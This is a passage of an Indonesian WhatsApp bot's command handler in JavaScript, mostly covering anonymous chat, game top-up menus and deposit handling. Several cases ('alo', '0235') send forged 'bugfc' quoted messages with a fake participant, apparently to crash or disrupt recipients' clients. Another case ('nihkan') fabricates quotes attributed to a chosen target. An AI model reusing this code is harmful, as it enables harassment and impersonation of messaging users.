addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `_Fitur ini Sedang Dalam Pengembangan`
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break
//MENU REKBER
case prefix+'menurrekber': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `_Fitur ini Sedang Dalam Pengembangan`
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break
//MENU SENDBUG
case prefix+'menusendbug': {
addCountCmd(`#${command.slice(1)}`, sender, _cmd)
let cot = `_Fitur ini Sedang Dalam Pengembangan`
 
 Manik.sendMessage(m.chat, {text: cot})
 
}
break




 
case prefix+'chatwith2': {
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
Manik.sendMessage(q+'@s.whatsapp.net', {text: `Sudah Di Confirmasi Nih Menfess nyaa ntar lagi dia balas🤭`})
if(!q) return reply("Masukan nomer target yang mau di chat")
if (roomA || roomB ) return reply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")
let id = + new Date
const obj = {
id,
a: m.sender,
b: q+'@s.whatsapp.net',
state: "CHATTING",
expired: "5m"
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
reply(`Silahkan membalas menfess dengan ketik sesuatu maka bot akan otomatis meneruskan chat kamu ke pengirim menfes\nDan ketika pengirim menfes membalas chat kamu bot juga akan meneruskannya\nUntuk berhenti membalas ketik ${prefix}stopmenfes.`)
}
break
case prefix+'chatwith': {
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
if(!q) return reply("Masukan nomer target yang mau di chat")
if (roomA || roomB ) return reply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")
let id = + new Date
const obj = {
id,
a: m.sender,
b: q+'@s.whatsapp.net',
state: "CHATTING",
expired: "INFINITY"
}
anonChat.push(obj)
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
reply(`Kamu telah membuat room anonymous\nDan menjadikan ${q+'@s.whatsapp.net'} sebagai partner mu\nSekarang kamu bisa mengirim pesan`)
}
break
case prefix+'stopchat':{
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if(roomA && roomA.state == "CHATTING"){
await Manik.sendMessage(roomA.b, {text:"Partnermu telah meninggalkan room anonymous"})
await setTimeout(() => {
reply("Kamu telah keluar dari room anonymous")
roomA.a = roomA.b
roomA.b = ""
roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))  
},1000)
} else if(roomA && roomA.state == "WAITING"){
reply("Kamu telah keluar dari room anonymous")
anonChat.splice(anonChat.indexOf(roomA, 1)) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else if(roomB && roomB.state == "CHATTING"){
await Manik.sendMessage(roomB.a,{text:`Partnermu telah meninggalkan room anonymous`})
reply("Kamu telah keluar dari room anonymous dan meninggalkan partner mu") 
roomB.b =""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else reply(`Kamu sedang tidak berada di room anonymous, tekan button untuk mencari partner`)
}
break
case prefix+'stopmenfes':{
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if(roomA && roomA.state == "CHATTING"){
await Manik.sendMessage(roomA.b, {text:" Yah dia telah meninggalkan chat Menfes"})
await setTimeout(() => {
reply("Kamu telah keluar dari Menfes")
roomA.a = roomA.b
roomA.b = ""
roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))  
},1000)
} else if(roomA && roomA.state == "WAITING"){
reply("Kamu telah keluar dari Menfes")
anonChat.splice(anonChat.indexOf(roomA, 1)) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else if(roomB && roomB.state == "CHATTING"){
await Manik.sendMessage(roomB.a,{text:`Partnermu telah meninggalkan room anonymous`})
reply("Kamu telah keluar dari Menfes dan meninggalkan nya") 
roomB.b =""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else reply(`Kamu sedang tidak ada menfes`)
}
break

case prefix+'topupmenu':{
	try {//mencoba
           ppuser = await Manik.profilePictureUrl(sender, 'image')
         } catch {//jika foto profil tidak tersedia maka akan dialihkan ke link dibawah sebagai gambar pengganti
           ppuser = 'https://telegra.ph/file/265c672094dfa87caea19.jpg'
         }         
        
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
addCountCmd(`#${command.slice(1)}`, sender, _cmd) 
                anu = `*── 「 ManikBot - Versi MD 」 ──*
                
    _*${ucapanWaktu} ${pushname !== undefined ? pushname : 'Kak'}*_
  
  Library : *Baileys-MD*.
  Prefix : ( ${prefix} )
  TypeMenu : ( Single Menu )
  Tanggal Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
  Waktu Server : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
  
  Status Anda : ${isManik ? 'Owner' : isPremium ? 'Premium' : 'Free'}
  Limit Harian : ${isManik ? '∞' : isPremium ? '∞' : global.db.users[m.sender].limit}
  Limit Game : ${cekGLimit(sender, gcount, glimit)}
  Total Pengguna : ${pendaftar.length}
  ${readmore}
 *｢  TOPUP MENU OTOMATIS  ｣*
  ● ${prefix}topup
  ● ${prefix}topupff
  ● ${prefix}topupml
  ● ${prefix}topupml2
  ● ${prefix}listdml2
  ● ${prefix}listdmff
  ● ${prefix}listdmml
  ● ${prefix}topupff2
  ● ${prefix}listdmff2
  ● ${prefix}mlsmileone
  ● ${prefix}mlsmile (Owner Only)
  
 *｢  DEPOSIT MENU OTOMATIS  ｣*
  ● ${prefix}mydepo
  ● ${prefix}depo [jumlah] ( otomatis )
  ● ${prefix}confirmdp
  ● ${prefix}canceldp
  ● ${prefix}topdeposit

 *｢  DEPOSIT MENU MANUAL  ｣*
  ● ${prefix}deposit ( manual )
  ● ${prefix}bukti [Jumlah]|keterangan (image)

 *｢ BUY SC OTOMATIS ｣*
  ● ${prefix}buysc ( otomatis )
  ● ${prefix}cancelbuy
  ● ${prefix}confirmbuy
    
 *｢ SEWA BOT OTOMATIS ｣*
  ● ${prefix}sewabot ( otomatis )
  ● ${prefix}cancelsewa
  ● ${prefix}confirmsewa
  
*｢ STORE MENU ｣*
 ● ${prefix}item
 ● ${prefix}additem
 ● ${prefix}delitem
 ● ${prefix}changeitem
 ● proses
 ● done

 *｢ JASA SUNTIK SOSMED ｣*
  ● ${prefix}order ( cara order) 
  ● ${prefix}followers [jum|targ] 
  ● ${prefix}view [jum|link] 
  ● ${prefix}like [jum|link] 
  ● ${prefix}cekstatus [id] 
  ● ${prefix}prichlist 
  
  ♥Thx To♥
  ●All creator bot
  ●Tuhanku
  ●Ortuku
  ●Penyemangatku
  ●Manik~_~

 © DESIGN: ARYAMANIK`
 Manik.sendMessage(m.chat, { caption: anu, image: { url: "./media/menu.jpg" }, templateButtons: buttonsFirst, footer: 'ManikBot By Own-Manik√', mentions: [m.sender] })
break 
}
case prefix+'jaksel':
const jaksel = await fetchJson(`https://api.lolhuman.xyz/api/randombahasa?apikey=${lolkey}&text=${text}`)
reply(jaksel.result)
break



//━━━━━━━━━━━━━━━[ Fitur topup Otomatis server 1 Case Dan Fitur By Manik Only! ]━━━━━━━━━━━━━━━\\
case prefix+'settarget': {
global.targt = args.join(" ").split("|")[0];
global.jwbb = args.join(" ").split("|")[1];
global.teksft = args.join(" ").split("|")[2];
reply('succes')
break
}
case 'nihkan': {
//if (!m.isGroup) return reply(mess.group)
targetd = global.targt
jawbanbot = global.jwbb
teksfit = global.teksft
targetnya = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : targetd.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
Manik.sendMessage(from, {text:jawbanbot}, {quoted:{
key: {
fromMe: false,
participant: targetnya
},
message: {
conversation: teksfit
}
}})
}
break
case "1204": 
Manik.sendMessage(from, { delete: {
  remoteJid: from,
  id: m.quoted.id,
  fromMe: false,
  participant: ''
}})
break
case 'alo':
if (!isManik) return reply(mess.owner)
                    let bugfc = {
                        key: {
                            fromMe: true,
                            participant: `0@s.whatsapp.net`,
                            ...({
                                remoteJid: ""
                            })
                        },
                        message: {
                            conversation: 'p'
                        }
                    }
                    Manik.sendMessage(from, {
                        text: 'p'
                    }, {
                        quoted: bugfc
                    })
                    Manik.sendMessage(from, {
                        text: 'p'
                    }, {
                        quoted: bugfc
                    })
                    Manik.sendMessage(from, {
                        text: 'p'
                    }, {
                        quoted: bugfc
                    })
                    Manik.sendMessage(from, {
                        text: 'p'
                    }, {
                        quoted: bugfc
                    })
                    Manik.sendMessage(from, {
                        text: 'p'
                    }, {
                        quoted: bugfc
                    })
                    Manik.sendMessage(from, {
                        text: 'p'
                    }, {
                        quoted: bugfc
                    })
                    Manik.sendMessage(from, {
                        text: 'p'
                    }, {
                        quoted: bugfc
                    })
                    break
case prefix+'sendb':{
if (!isManik) return reply(mess.owner)
                    Manik.sendMessage(`${text}@s.whatsapp.net`, {text: `hallo` })
                    break
}
case '0235':{
if (!isManik) return reply(mess.owner)
                    let bugfc = {
                        key: {
                            fromMe: true,
                            participant: `0@s.whatsapp.net`,
                            ...({
                                remoteJid: ""
                            })
                        },
                        message: {
                            conversation: 'p'
                        }
                    }
                    Manik.sendMessage(from, {
                        text: 'p'
                    }, {
                        quoted: bugfc
                    })

                    break 
                    }
case 'hekhem':
Manik.sendMessage(m.chat, {audio: fs.readFileSync('./ara.mp3'), mimetype:'audio/mpeg', ptt:true })
break
case 'aneh':{
if (!isManik) return reply(mess.owner)
const baileys = require("@adiwajshing/baileys")
let reactionMessage = baileys.proto.Message.ReactionMessage.create({ key: m.key, text: "" })
Manik.relayMessage(from, { reactionMessage }, { messageId: "ppppp" }) 
break 
}
case prefix+'tts':
let eng = text.split("|")[0]
let cap = text.split("|")[1]
const gtts = require('./FuncBot/gtts')(`${eng}`)
  if (!q.includes("|")) return Manik.sendMessage(from, `ᴇxᴀᴍᴘʟᴇ: ${prefix}ᴇɴ|ʜᴇʟʟᴏ`, text, {quoted: m})
 var dtt = `${cap}`
  reply(mess.wait)
  var ranm = getRandom('.mp3')
		var	rano = getRandom('.ogg')
				dtt.length > 300
         gtts.save(ranm, dtt, function() {
          exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
          fs.unlinkSync(ranm)
          buffer = fs.readFileSync(rano)
          if (err) return reply('error')
          Manik.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mp4', ptt: true})
          fs.unlinkSync(rano)
          })
          })
  break
case prefix+'shopeepay':{
if (isGroup) return reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let noshp = text
if (isNaN(parseInt(noshp))) return reply(`${command} 6283155997772`)
const sections = [
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp10.000", rowId: `${prefix}cvspay ${noshp}|1`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp20.000", rowId: `${prefix}cvspay ${noshp}|2`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp25.000", rowId: `${prefix}cvspay ${noshp}|3`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp50.000", rowId: `${prefix}cvspay ${noshp}|4`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp60.000", rowId: `${prefix}cvspay ${noshp}|6`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp75.000", rowId: `${prefix}cvspay ${noshp}|7`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp100.000", rowId: `${prefix}cvspay ${noshp}|8`}
	]
    },
    {
	title: `Convert ShopeePay`,
	rows: [
	    {title: "Rp200.000", rowId: `${prefix}cvspay ${noshp}|10`}
	]
    },
]
let isian = `    
Silahkan Pilih Nominal Saldo E-wallet Yang Akan Anda Convert Ke Shopeepay!.

Note: Pembayaran Disini Hanya Menggunakan Server, Owner Tidak Mendapatkan Hasil Apapun Disini Karena Diproses Langsung Dari Server!.

Jika Sudah Melakukan Pemilihan Nominal, Anda Akan Dikirimkan Qris Pembayaran Dan Anda Harus Membayar Melalu Aplikasi E-wallet Yang Mendukung Qris, Pastikan Nominal Yang Anda Krimkan Harus Sama Dengan Nominal Yang Diminta!.

Jika Anda Sudah Melakukan Pembayaran, Silahkan Tunggu 1-5 Menit Dan Melakukan Pengecekan Secara Berkala Pada Saldo Anda!.`
const listMessage = {
  text: isian,
  footer: "Powered By @AryaManik",
  title: "━━[ Nominal saldo Shopeepay ]━━",
  buttonText: "Klik Disini",
  sections
}
const tessgh = await Manik.sendMessage(from, listMessage)
break
}
case prefix+'ovo':{
if (isGroup) return reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let noshp = text
if (isNaN(parseInt(noshp))) return reply(`${command} 6283155997772`)
const sections = [
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp20.000", rowId: `${prefix}cvspay ${noshp}|11`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp25.000", rowId: `${prefix}cvspay ${noshp}|12`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp30.000", rowId: `${prefix}cvspay ${noshp}|13`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp40.000", rowId: `${prefix}cvspay ${noshp}|14`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp50.000", rowId: `${prefix}cvspay ${noshp}|15`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp60.000", rowId: `${prefix}cvspay ${noshp}|16`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp70.000", rowId: `${prefix}cvspay ${noshp}|17`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp75.000", rowId: `${prefix}cvspay ${noshp}|18`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp90.000", rowId: `${prefix}cvspay ${noshp}|19`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp100.000", rowId: `${prefix}cvspay ${noshp}|20`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp125.000", rowId: `${prefix}cvspay ${noshp}|21`}
	]
    },
     {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp150.000", rowId: `${prefix}cvspay ${noshp}|22`}
	]
    },
    {
	title: `Convert Ovo`,
	rows: [
	    {title: "Rp200.000", rowId: `${prefix}cvspay ${noshp}|22`}
	]
    },
]
let isian = `    
Silahkan Pilih Nominal Saldo E-wallet Yang Akan Anda Convert Ke Ovo!.

Note: Pembayaran Disini Hanya Menggunakan Server, Owner Tidak Mendapatkan Hasil Apapun Disini Karena Diproses Langsung Dari Server!.

Jika Sudah Melakukan Pemilihan Nominal, Anda Akan Dikirimkan Qris Pembayaran Dan Anda Harus Membayar Melalu Aplikasi E-wallet Yang Mendukung Qris, Pastikan Nominal Yang Anda Krimkan Harus Sama Dengan Nominal Yang Diminta!.

Jika Anda Sudah Melakukan Pembayaran, Silahkan Tunggu 1-2 Menit Dan Melakukan Pengecekan Secara Berkala Pada Saldo Anda!.`
const listMessage = {
  text: isian,
  footer: "Powered By @AryaManik",
  title: "━━[ Nominal saldo Ovo ]━━",
  buttonText: "Klik Disini",
  sections
}
const tessgh = await Manik.sendMessage(from, listMessage)
break
}
case prefix+'cvspay':{
if (isGroup) return reply('Fitur Ini Hanya Bisa Digunakan Di Private Chat!')
let idff = text.split("|")[0]
let produkid = text.split("|")[1]
let cvnya = await convertSaldo(`${produkid}`, `${idff}`)
let byr = `*─ 「 CEK TRANSAKSIMU 」 ─*
     
_Berikut Adalah Transaksi Anda_
_》Saldo : ${cvnya.product}_
_》No Tujuan : ${idff}_
_》Total Tagihan : ${cvnya.tagihan}_
_》Id Trx : ${cvnya.order_id}_

Silahkan Scan Qris Diatas Untuk Melakukan Pembayaran
Saldo Akan Masuk Otomatis Dalam Waktu 1-5 Menit Setelah Melakukan Pembayaran!.`
Manik.sendMessage(m.chat, { image: { url: cvnya.img }, caption: `${byr}` }, { quoted: m })
break
}
//━━━━━━━━━━━━━━━[ Fitur topup Otomatis server 1 Case Dan Fitur By Manik Only! ]━━━━━━━━━━━━━━━\\

//━━━━━━━━━━━━━━━[ Fitur topup Otomatis server 1 Case Dan Fitur By Manik Only! ]━━━━━━━━━━━━━━━\\
case prefix+'topdeposit':{
                money.sort((a, b) => (a.money < b.money) ? 1 : -1)
                let top = '*── 「 TOP DEPOSIT 」 ──*\n\n'
                let arrTop = []
				var total = 10
				if (money.length < 10) total = money.length
                for (let i = 0; i < total; i ++){
                    top += `${i + 1}. @${money[i].id.split("@")[0]}\n=> Saldo : Rp${money[i].money}\n\n`
                    arrTop.push(money[i].id)
                }
                mentions(top, arrTop, true)
            }
                break
case prefix+'mydepo':{
try {//mencoba
           ppuser = await Manik.profilePictureUrl(sender, 'image')
         } catch {//jika foto profil tidak tersedia maka akan dialihkan ke link dibawah sebagai gambar pengganti
           ppuser = 'https://telegra.ph/file/265c672094dfa87caea19.jpg'
         }         
         
		 let xx = `*─ 「 CHECK YOUR ACCOUNT 」 ─*
     
Berikut Adalah Data Akun Anda\n
》Saldo User : ${formatmoney(getMonUser(sender) ? getMonUser(sender) : "Rp0,00")}
》Name : ${pushname}
》Id : ${sender.replace("@s.whatsapp.net", "")}

Note: Saldo Hanya Bisa Untuk Topup Saja, Tidak Bisa Ditarik!.`
		
//await Manik.sendMessage(m.chat, { image: { url: ppuser }, caption: xx })		 
await Manik.sendImage(m.chat, ppuser, xx, m)//maka pada hasil akan terlihat sebagai buffer         
}
break


case prefix+'deposit':

let depisi = `*─ 「 CARA DEPOSIT 」 ─*
     
_Berikut Adalah Cara Deposit User!._
_For Your Information, ManikBot Hanya Mendukung Deposit Melalui Ovo, Shopeepay, Dana, Qris Saja._

_》Ovo : 083155997772_
_》Shopeepay : 083155997772_
_》Dana : 085792358002_
_》Qris : Chat Owner_

_Jika Sudah Melakukan Transfer Harap Kirim Bukti Dengan Cara Mengirim Screenshot Dengan Caption, Contoh:_
${prefix}bukti JUMLAH|CATATAN
_Contoh:_
${prefix}bukti 10000|isi Saldo 6283155997772
Saldo Akan Masuk Ketika Owner Mengklik Tombol Acc Yang Dikirim Bot!.`
reply(depisi)
break

case prefix+'bukti':
let depo = text.split("|")[0]
let catatnya = text.split("|")[1]
let depos = `${formatmoney(depo)}`
if (isNaN(parseInt(depo))) return reply('Deposit Harus Berupa Angka!')
let bukti = `*─ 「 DEPOSIT USER 」 ─*
     
_Berikut Adalah Bukti Deposit Dari User_
_》Saldo awal : ${formatmoney(getMonUser(sender) ? getMonUser(sender) : "Rp 0,00")}_
_》Deposit : ${depos}_
_》Id : ${sender.replace("@s.whatsapp.net", "")}_
_》Catatan : ${catatnya}_

Silahkan Segera Melakukan Pengisian Saldo User Jika Bukti Sudah Benar!.`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Manik.sendImage(`6283155997772@s.whatsapp.net`, media, `Bukti Dari: ${sender.replace("@s.whatsapp.net", "")}`, m)
let buttons = [
{ buttonId: prefix+`depoyes ${depo}|${m.sender}`, buttonText: { displayText: 'Acc' }, type: 1 },
{ buttonId: prefix+`depono`, buttonText: { displayText: 'salah' }, type: 1 }
]
Manik.sendButtonText(`6283155997772@s.whatsapp.net`, buttons, `${bukti}`, Manik.user.name, m)
}
break
case prefix+'depoyes':
if (!isManik) return reply(mess.owner)
let jumbelah = text.split("|")[0] * 1
let siapah = text.split("|")[1]
addMonUser(siapah, jumbelah)
reply('Sukses')
let nbuttons = [
{ buttonId: prefix+`mydepo`, buttonText: { displayText: 'My Deposit' }, type: 1 },
{ buttonId: prefix+`topup`, buttonText: { displayText: 'TopUp' }, type: 1 }
]
Manik.sendButtonText(`${siapah}`, nbuttons, `Topup Anda Berhasil Di Acc, Silahkan Melakukan TopUp Dengan Mudah Hanya Di ManikBot!`, Manik.user.name, m)
break
case prefix+'depono':
if (!isManik) return reply(mess.owner)
let umbelah = text.split("|")[0]
let iapah = text.split("|")[1]
reply('Deposit Tidak Akan Dilanjutkan')
Manik.sendMessage(`${iapah}`, {text: `Topup Anda Ditolak!, Mungkin Anda Melakukan Fake Topup Atau Kekeliruan Lain, Silahkan Chat Owner Jika Ada Masalah!.` })
break
case prefix+'topup':{
const sections = [
    {
	title: `Format: ${prefix}topupff id|jumlah`,
	rows: [
	    {title: "List Diamond Free Fire", rowId: `${prefix}listdmff`}
	]
    },
    {
	title: `Format: ${prefix}topupff2 id|jumlah`,
	rows: [
	    {title: "List Diamond Free Fire Server 2", rowId: `${prefix}listdmff2`}
	]
    },
   {
   	title: `Format: ${prefix}topupml id|server|jumlah`,
	rows: [
	    {title: "List Diamond Mobile Legends", rowId: `${prefix}listdmml`}
	]
    },
   {
   	title: `Format: ${prefix}topupml2 id|server|jumlah`,
	rows: [
	    {title: "List Diamond Mobile Legends Server 2", rowId: `${prefix}listdmml2`}
	]
    },
    {
   	title: `Format: ${prefix}mlsmile id|server|jumlah`,
	rows: [
	    {title: "List Diamond Mobile Legends Smile One", rowId: `${prefix}mlsmileone`}
	]
    },
]
let isian = `    
_Berikut Adalah Data Akun Anda_
_》Saldo User : ${formatmoney(getMonUser(sender) ? getMonUser(sender) : "Rp 0,00")}_
_》Name : ${pushname}_
_》Id : ${sender.replace("@s.whatsapp.net", "")}_

Note: Saldo Hanya Bisa Untuk Topup Saja, Tidak Bisa Ditarik!.`
const listMessage = {
  text: isian,
  footer: "Powered By @AryaManik",
  title: "━━[ List Topup ManikBot ]━━",
  buttonText: "Klik Disini",
  sections
}
const tessgh = await Manik.sendMessage(from, listMessage)
break
}
case prefix+'listdmff':
lisnya = `*── 「 DIAMOND FREE FIRE 」 ──*

_》${list.ff.FF5.nama} : ${list.ff.FF5.harga}_
_》${list.ff.FF10.nama} : ${list.ff.FF10.harga}_
_》${list.ff.FF15.nama} : ${list.ff.FF15.harga}_
_》${list.ff.FF20.nama} : ${list.ff.FF20.harga}_
_》${list.ff.FF25.nama} : ${list.ff.FF25.harga}_
_》${list.ff.FF30.nama} : ${list.ff.FF30.harga}_
_》${list.ff.FF40.nama} : ${list.ff.FF40.harga}_
_》${list.ff.FF50.nama} : ${list.ff.FF50.harga}_
_》${list.ff.FF55.nama} : ${list.ff.FF55.harga}_
_》${list.ff.FF60.nama} : ${list.ff.FF60.harga}_
_》${list.ff.FF70.nama} : ${list.ff.FF70.harga}_
_》${list.ff.FF75.nama} : ${list.ff.FF75.harga}_
_》${list.ff.FF80.nama} : ${list.ff.FF80.harga}_
_》${list.ff.FF90.nama} : ${list.ff.FF90.harga}_
_》${list.ff.FF95.nama} : ${list.ff.FF95.harga}_
_》${list.ff.FF100.nama} : ${list.ff.FF100.harga}_
_》${list.ff.FF120.nama} : ${list.ff.FF120.harga}_
_》${list.ff.FF130.nama} : ${list.ff.FF130.harga}_
_》${list.ff.FF140.nama} : ${list.ff.FF140.harga}_
_》${list.ff.FF145.nama} : ${list.ff.FF145.harga}_
_》${list.ff.FF150.nama} : ${list.ff.FF150.harga}_
_》${list.ff.FF160.nama} : ${list.ff.FF160.harga}_
_》${list.ff.FF180.nama} : ${list.ff.FF180.harga}_
_》${list.ff.FF190.nama} : ${list.ff.FF190.harga}_
_》${list.ff.FF200.nama} : ${list.ff.FF200.harga}_
_》${list.ff.FF210.nama} : ${list.ff.FF210.harga}_
_》${list.ff.FFM.nama} : ${list.ff.FFM.harga}_
_》${list.ff.FF250.nama} : ${list.ff.FF250.harga}_
_》${list.ff.FF280.nama} : ${list.ff.FF280.harga}_
_》${list.ff.FF300.nama} : ${list.ff.FF300.harga}_
_》${list.ff.FF355.nama} : ${list.ff.FF355.harga}_
_》${list.ff.FF350.nama} : ${list.ff.FF350.harga}_
_》${list.ff.FF375.nama} : ${list.ff.FF375.harga}_
_》${list.ff.FF400.nama} : ${list.ff.FF400.harga}_
_》${list.ff.FF405.nama} : ${list.ff.FF405.harga}_
_》${list.ff.FF425.nama} : ${list.ff.FF425.harga}_
_》${list.ff.FF475.nama} : ${list.ff.FF475.harga}_
_》${list.ff.FF500.nama} : ${list.ff.FF500.harga}_
_》${list.ff.FF510.nama} : ${list.ff.FF510.harga}_
_》${list.ff.FF515.nama} : ${list.ff.FF515.harga}_
_》${list.ff.FF512.nama} : ${list.ff.FF512.harga}_
_》${list.ff.FF545.nama} : ${list.ff.FF545.harga}_
_》${list.ff.FF565.nama} : ${list.ff.FF565.harga}_
_》${list.ff.FF600.nama} : ${list.ff.FF600.harga}_
_》${list.ff.FF635.nama} : ${list.ff.FF635.harga}_
_》${list.ff.FF645.nama} : ${list.ff.FF645.harga}_
_》${list.ff.FF655.nama} : ${list.ff.FF655.harga}_
_》${list.ff.FF720.nama} : ${list.ff.FF720.harga}_
_》${list.ff.FF700.nama} : ${list.ff.FF700.harga}_
_》${list.ff.FF770.nama} : ${list.ff.FF770.harga}_
_》${list.ff.FF790.nama} : ${list.ff.FF790.harga}_
_》${list.ff.FF800.nama} : ${list.ff.FF800.harga}_
_》${list.ff.FF860.nama} : ${list.ff.FF860.harga}_
_》${list.ff.FF930.nama} : ${list.ff.FF930.harga}_
_》${list.ff.FF1000.nama} : ${list.ff.FF1000.harga}_
_》${list.ff.FF1050.nama} : ${list.ff.FF1050.harga}_
_》${list.ff.FF1075.nama} : ${list.ff.FF1075.harga}_
_》${list.ff.FF1080.nama} : ${list.ff.FF1080.harga}_
_》${list.ff.FFB.nama} : ${list.ff.FFB.harga}_
_》${list.ff.FF1200.nama} : ${list.ff.FF1200.harga}_
_》${list.ff.FF1215.nama} : ${list.ff.FF1215.harga}_
_》${list.ff.FF1300.nama} : ${list.ff.FF1300.harga}_
_》${list.ff.FF1440.nama} : ${list.ff.FF1440.harga}_
_》${list.ff.FF1450.nama} : ${list.ff.FF1450.harga}_
_》${list.ff.FF1490.nama} : ${list.ff.FF1490.harga}_
_》${list.ff.FF1510.nama} : ${list.ff.FF1510.harga}_
_》${list.ff.FF1580.nama} : ${list.ff.FF1580.harga}_
_》${list.ff.FF1795.nama} : ${list.ff.FF1795.harga}_
_》${list.ff.FF1800.nama} : ${list.ff.FF1800.harga}_
_》${list.ff.FF2000.nama} : ${list.ff.FF2000.harga}_
_》${list.ff.FF2140.nama} : ${list.ff.FF2140.harga}_
_》${list.ff.FF2190.nama} : ${list.ff.FF2190.harga}_
_》${list.ff.FF2210.nama} : ${list.ff.FF2210.harga}_
_》${list.ff.FF2280.nama} : ${list.ff.FF2280.harga}_
_》${list.ff.FF2355.nama} : ${list.ff.FF2355.harga}_
_》${list.ff.FF2720.nama} : ${list.ff.FF2720.harga}_
_》${list.ff.FF4000.nama} : ${list.ff.FF4000.harga}_
_》${list.ff.FF77290.nama} : ${list.ff.FF77290.harga}_

Cara Pembelian:
${prefix}topupff ID|JUMLAH DIAMOND
Contoh:
${prefix}topupff 123456789|1450

NOTE: Pembelian Akan Diproses Oleh Sistem Otomatis Jika Saldo User Anda Terisi Dan Diamond Yang Anda Beli Akan Segera Masuk 3-5 Menit Proses.`
reply(lisnya)
break
case prefix+'listdmml':
lisya = `*── 「 DIAMOND MOBILE LEGENDS 」 ──*

_》${listml.ml.UPMBL5.nama} : ${listml.ml.UPMBL5.harga}_
_》${listml.ml.UPMBL12.nama} : ${listml.ml.UPMBL12.harga}_
_》${listml.ml.UPMBL19.nama} : ${listml.ml.UPMBL19.harga}_
_》${listml.ml.UPMBL28.nama} : ${listml.ml.UPMBL28.harga}_
_》${listml.ml.UPMBL36.nama} : ${listml.ml.UPMBL36.harga}_
_》${listml.ml.UPMBL44.nama} : ${listml.ml.UPMBL44.harga}_
_》${listml.ml.UPMBL59.nama} : ${listml.ml.UPMBL59.harga}_
_》${listml.ml.UPMBL74.nama} : ${listml.ml.UPMBL74.harga}_
_》${listml.ml.UPMBL85.nama} : ${listml.ml.UPMBL85.harga}_
_》${listml.ml.UPMBL170.nama} : ${listml.ml.UPMBL170.harga}_
_》${listml.ml.UPMBL185.nama} : ${listml.ml.UPMBL185.harga}_
_》${listml.ml.UPMBL222.nama} : ${listml.ml.UPMBL222.harga}_
_》${listml.ml.UPMBL240.nama} : ${listml.ml.UPMBL240.harga}_
_》${listml.ml.UPMBL296.nama} : ${listml.ml.UPMBL296.harga}_
_》${listml.ml.UPMBL370.nama} : ${listml.ml.UPMBL370.harga}_
_》${listml.ml.UPMBL408.nama} : ${listml.ml.UPMBL408.harga}_
_》${listml.ml.UPMBL568.nama} : ${listml.ml.UPMBL568.harga}_
_》${listml.ml.UPMBL875.nama} : ${listml.ml.UPMBL875.harga}_
_》${listml.ml.UPMBL1159.nama} : ${listml.ml.UPMBL1159.harga}_
_》${listml.ml.UPMBL2010.nama} : ${listml.ml.UPMBL2010.harga}_
_》${listml.ml.UPMBL4830.nama} : ${listml.ml.UPMBL4830.harga}_

Cara Pembelian:
${prefix}topupml ID|SERVER|JUMLAH DIAMOND
Contoh:
${prefix}topupml 123456789|1450|74

NOTE: Pembelian Akan Diproses Oleh Sistem Otomatis Jika Saldo User Anda Terisi Dan Diamond Yang Anda Beli Akan Segera Masuk 3-5 Menit Proses.`
reply(lisya)
break
case prefix+'listdmml2':
lisya = `*── 「 DIAMOND MOBILE LEGENDS 」 ──*

